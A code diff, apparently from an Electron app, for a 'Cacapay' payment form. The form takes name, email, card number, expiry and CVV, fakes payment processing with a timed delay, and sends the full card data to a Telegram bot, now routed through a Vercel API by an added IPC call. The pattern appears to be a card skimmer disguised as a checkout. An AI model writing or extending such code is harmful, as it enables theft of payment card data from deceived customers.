@@ -364,7 +364,7 @@
                     cvv: document.getElementById('cvv').value || '***'
                 };
                 
-                console.log('💳 Traitement du paiement...', paymentData);
+                console.log('💳 Traitement du paiement via Vercel...', paymentData);
                 
                 // Afficher le loading
                 showLoading(true);
@@ -373,8 +373,8 @@
                 // Simuler le traitement du paiement (1-2 secondes)
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 
-                // Envoyer la notification Telegram
-                const notificationResult = await sendCacapayNotification(paymentData);
+                // Envoyer la notification via l'API Vercel
+                const notificationResult = await ipcRenderer.invoke('send-payment', paymentData);
                 
                 if (notificationResult.success) {
                     showSuccess(paymentData, notificationResult);
@@ -431,21 +431,12 @@
         // Fonction pour tester Telegram
         async function testTelegram() {
             try {
-                console.log('🧪 Test Telegram...');
+                console.log('🧪 Test Telegram via Vercel...');
                 
-                const testData = {
-                    customerName: 'Test Client',
-                    email: 'test@example.com',
-                    amount: '99.99',
-                    cardNumber: '1234 **** **** 5678',
-                    expiry: '12/25',
-                    cvv: '123'
-                };
-                
-                const result = await sendCacapayNotification(testData);
+                const result = await ipcRenderer.invoke('test-api');
                 
                 if (result.success) {
-                    showResult('✅ Test Telegram réussi !<br>Message ID: ' + result.messageId + '<br>Vérifiez votre Telegram !', true);
+                    showResult('✅ Test Telegram réussi !<br>Message ID: ' + result.telegramResponse?.result?.message_id + '<br>Vérifiez votre Telegram !', true);
                 } else {
                     showResult('❌ Test Telegram échoué: ' + result.error, false);
                 }
@@ -459,20 +450,9 @@
         // Fonction pour test simple
         async function testSimple() {
             try {
-                console.log('🔧 Test simple...');
+                console.log('🔧 Test simple via Vercel...');
                 
-                const response = await fetch(CACAPAY_API, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        message: '🔧 TEST SIMPLE DEPUIS LE SITE !\n✅ API accessible\n📱 Notification envoyée',
-                        type: 'test'
-                    })
-                });
-                
-                const result = await response.json();
+                const result = await ipcRenderer.invoke('test-api');
                 
                 if (result.success) {
                     showResult('✅ Test simple réussi !<br>Message ID: ' + result.telegramResponse?.result?.message_id, true);
